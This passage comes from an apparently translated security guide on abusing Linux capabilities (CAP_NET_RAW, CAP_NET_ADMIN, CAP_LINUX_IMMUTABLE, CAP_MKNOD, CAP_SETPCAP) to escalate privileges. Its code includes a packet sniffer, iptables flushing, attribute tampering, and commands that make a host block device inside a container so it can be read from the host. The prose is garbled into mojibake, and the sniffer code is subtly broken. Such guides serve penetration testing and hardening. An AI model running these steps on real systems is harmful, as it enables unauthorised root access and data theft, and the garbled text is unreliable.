flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдХреНрд╖рдорддрд╛ рдзрд╛рд░рдХ рдХреЛ **рдиреЗрдЯрд╡рд░реНрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдмрджрд▓рд╛рд╡ рдХрд░рдиреЗ** рдХреА рд╢рдХреНрддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕реЗрдЯрд┐рдВрдЧреНрд╕, рд░рд╛рдЙрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓, рд╕реЙрдХреЗрдЯ рдЕрдиреБрдорддрд┐рдпрд╛рдБ, рдФрд░ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд┐рдП рдЧрдП рдиреЗрдЯрд╡рд░реНрдХ рдирд╛рдорд╕реНрдкреЗрд╕ рдХреЗ рднреАрддрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдпрд╣ рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ **рдкреНрд░реЛрдорд┐рд╕реНрдХреНрдпреВрдЕрд╕ рдореЛрдб** рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рднреА рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдирд╛рдорд╕реНрдкреЗрд╕ рдХреЗ рдмреАрдЪ рдкреИрдХреЗрдЯ рд╕реНрдирд┐рдлрд╝рд┐рдВрдЧ рдХреА рдЬрд╛ рд╕рдХреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ **python рдмрд╛рдЗрдирд░реА** рдореЗрдВ рдпреЗ рдХреНрд╖рдорддрд╛рдПрдБ рд╣реИрдВред
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ inode рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред** рдЖрдк рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рдмрдврд╝рд╛ рд╕рдХрддреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдп рд╣реИ рдФрд░ рдкрд╛рдпрдерди рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдп рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдорддреМрд░ рдкрд░ рдЗрд╕ рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдп рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рд╕реЗрдЯ рдФрд░ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `chroot(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `chroot(2)` рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рднрд╛рдЧрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ:

* [рд╡рд┐рднрд┐рдиреНрди chroot рд╕рдорд╛рдзрд╛рдиреЛрдВ рд╕реЗ рдмрд╛рд╣рд░ рдХреИрд╕реЗ рдирд┐рдХрд▓реЗрдВ](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot рднрд╛рдЧрдиреЗ рдХрд╛ рдЙрдкрдХрд░рдг](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдХреЗрд╡рд▓ рд╕рд┐рд╕реНрдЯрдо рдкреБрдирд░рд╛рд░рдВрдн рдХреЗ рд▓рд┐рдП `reboot(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛, рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдХреВрд▓рд┐рдд рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдорд╛рдВрдб рдЬреИрд╕реЗ `LINUX_REBOOT_CMD_RESTART2` рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдмрд▓реНрдХрд┐ рдпрд╣ рдирдП рдпрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХреНрд░реИрд╢ рдХрд░реНрдиреЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `kexec_load(2)` рдФрд░, Linux 3.17 рд╕реЗ рдЖрдЧреЗ, `kexec_file_load(2)` рдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдХреЛ Linux 2.6.37 рдореЗрдВ рд╡реНрдпрд╛рдкрдХ **CAP_SYS_ADMIN** рд╕реЗ рдЕрд▓рдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `syslog(2)` рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХреНрд╖рдорддрд╛ `/proc` рдФрд░ рд╕рдорд╛рди рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд░реНрдиреЗрд▓ рдкрддреЗ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬрдм `kptr_restrict` рд╕реЗрдЯрд┐рдВрдЧ 1 рдкрд░ рд╣реЛрддреА рд╣реИ, рдЬреЛ рдХрд░реНрдиреЗрд▓ рдкрддреЗ рдХреЗ рдкреНрд░рджрд░реНрд╢рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИред Linux 2.6.39 рд╕реЗ, `kptr_restrict` рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ 0 рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдХрд░реНрдиреЗрд▓ рдкрддреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХрдИ рд╡рд┐рддрд░рдг рдЗрд╕реЗ 1 (uid 0 рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдкрддреЗ рдЫрд┐рдкрд╛рдирд╛) рдпрд╛ 2 (рд╣рдореЗрд╢рд╛ рдкрддреЗ рдЫрд┐рдкрд╛рдирд╛) рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **CAP_SYSLOG** `dmesg_restrict` 1 рдкрд░ рд╕реЗрдЯ рд╣реЛрдиреЗ рдкрд░ `dmesg` рдЖрдЙрдЯрдкреБрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, **CAP_SYS_ADMIN** рдРрддрд┐рд╣рд╛рд╕рд┐рдХ рдкреВрд░реНрд╡рд╡реГрддреНрдд рдХреЗ рдХрд╛рд░рдг `syslog` рд╕рдВрдЪрд╛рд▓рди рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИред

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `mknod` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдирд┐рдпрдорд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ, FIFOs (рдирд╛рдорд┐рдд рдкрд╛рдЗрдк), рдпрд╛ UNIX рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯ рдмрдирд╛рдиреЗ рд╕реЗ рдкрд░реЗ рдмрдврд╝рд╛рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- **S_IFCHR**: рд╡рд░реНрдг рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреЛ рдЯрд░реНрдорд┐рдирд▓ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╣реИрдВред
- **S_IFBLK**: рдмреНрд▓реЙрдХ рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреЛ рдбрд┐рд╕реНрдХ рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╣реИрдВред

рдпрд╣ рдХреНрд╖рдорддрд╛ рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЙрдкрдХрд░рдг рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреЛ рд╡рд░реНрдг рдпрд╛ рдмреНрд▓реЙрдХ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реАрдзреЗ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рддреА рд╣реИред

рдпрд╣ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдбреЙрдХрд░ рдХреНрд╖рдорддрд╛ рд╣реИ ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))ред

рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реЛрд╕реНрдЯ рдкрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ (рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдкрдврд╝рдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЗрди рд╢рд░реНрддреЛрдВ рдХреЗ рддрд╣рдд:

1. рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (рдЕрдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб)ред
2. рдХрдВрдЯреЗрдирд░ рдкрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб (EUID 0), рдФрд░ рдкреНрд░рднрд╛рд╡реА `CAP_MKNOD`)ред
3. рд╣реЛрд╕реНрдЯ рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╕рдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдорд╕реНрдерд╛рди рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдПрдХ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдмрдирд╛рдиреЗ рдФрд░ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рдЪрд░рдг:**

1. **рд╣реЛрд╕реНрдЯ рдкрд░ рдПрдХ рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ:**
- `id` рдХреЗ рд╕рд╛рде рдЕрдкрдиреЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░реЗрдВ, рдЬреИрд╕реЗ, `uid=1000(standarduser)`ред
- рд▓рдХреНрд╖рд┐рдд рдЙрдкрдХрд░рдг рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `/dev/sdb`ред

2. **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ `root` рдХреЗ рд░реВрдк рдореЗрдВ:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **рд╣реЛрд╕реНрдЯ рдкрд░ рд╡рд╛рдкрд╕:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `/dev/sdb` рд╕реЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рд╛рдЭрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдорд╕реНрдерд╛рди рдФрд░ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рд╕реЗрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реБрдПред

### CAP\_SETPCAP

**CAP_SETPCAP** рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рджреВрд╕рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рдмрджрд▓рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рднрд╛рд╡реА, рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓реЗ, рдФрд░ рдЕрдиреБрдордд рд╕реЗрдЯ рд╕реЗ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдпрд╛ рд╣рдЯрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗрд╡рд▓ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреЛ рдЙрд╕рдХреЗ рдЕрдкрдиреЗ рдЕрдиреБрдордд рд╕реЗрдЯ рдореЗрдВ рд╣реИрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЕрдкрдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рдирд╣реАрдВ рдмрдврд╝рд╛ рд╕рдХрддреАред рд╣рд╛рд▓ рдХреЗ рдХрд░реНрдиреЗрд▓ рдЕрдкрдбреЗрдЯ рдиреЗ рдЗрди рдирд┐рдпрдореЛрдВ рдХреЛ рдХрдбрд╝рд╛ рдХрд░ рджрд┐рдпрд╛ рд╣реИ, `CAP_SETPCAP` рдХреЛ рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рдпрд╛ рдЕрдкрдиреЗ рд╡рдВрд╢рдЬреЛрдВ рдХреЗ рдЕрдиреБрдордд рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдорд┐рдд рдХрд░ рджрд┐рдпрд╛ рд╣реИ, рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рд╕реЗред рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдкреНрд░рднрд╛рд╡реА рд╕реЗрдЯ рдореЗрдВ `CAP_SETPCAP` рдФрд░ рд▓рдХреНрд╖рд┐рдд рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЕрдиреБрдордд рд╕реЗрдЯ рдореЗрдВ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП `capset()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдПред рдпрд╣ `CAP_SETPCAP` рдХреЗ рдореБрдЦреНрдп рдХрд╛рд░реНрдп рдФрд░ рд╕реАрдорд╛рдУрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рдмрдВрдзрди рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрд╡рд░реНрдзрди рдореЗрдВ рдЗрд╕рдХреА рднреВрдорд┐рдХрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

**`CAP_SETPCAP`** рдПрдХ рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рджреВрд╕рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдкреНрд░рднрд╛рд╡реА, рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓реЗ, рдФрд░ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рд╕реЗ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдпрд╛ рд╣рдЯрд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдкрд░ рдХреБрдЫ рдкреНрд░рддрд┐рдмрдВрдз рд╣реИрдВред

`CAP_SETPCAP` рд╡рд╛рд▓реА рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдХреЗрд╡рд▓ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдпрд╛ рд╣рдЯрд╛ рд╕рдХрддреА рд╣реИ рдЬреЛ рдЙрд╕рдХреЗ рдЕрдкрдиреЗ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рд╣реИрдВ**ред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рджреЗ рд╕рдХрддреА рдпрджрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╡рд╣ рдХреНрд╖рдорддрд╛ рд╕реНрд╡рдпрдВ рдирд╣реАрдВ рд╣реИред рдпрд╣ рдкреНрд░рддрд┐рдмрдВрдз рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЕрдкрдиреЗ рд╕реНрддрд░ рд╕реЗ рдЕрдзрд┐рдХ рдмрдврд╝рд╛рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣рд╛рд▓ рдХреЗ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, `CAP_SETPCAP` рдХреНрд╖рдорддрд╛ рдХреЛ **рдФрд░ рдЕрдзрд┐рдХ рд╕реАрдорд┐рдд** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдЕрдм рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рдордирдорд╛рдиреЗ рдврдВрдЧ рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреАред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдпрд╣ **рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдкрдиреЗ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдпрд╛ рдЕрдкрдиреЗ рд╡рдВрд╢рдЬреЛрдВ рдХреЗ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ**ред рдпрд╣ рдкрд░рд┐рд╡рд░реНрддрди рдХреНрд╖рдорддрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреЗрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

`CAP_SETPCAP` рдХрд╛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдкрдиреЗ рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рд▓рдХреНрд╖рд┐рдд рдХреНрд╖рдорддрд╛рдПрдБ рдЖрдкрдХреЗ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдЖрдк рдлрд┐рд░ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `capset()` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ 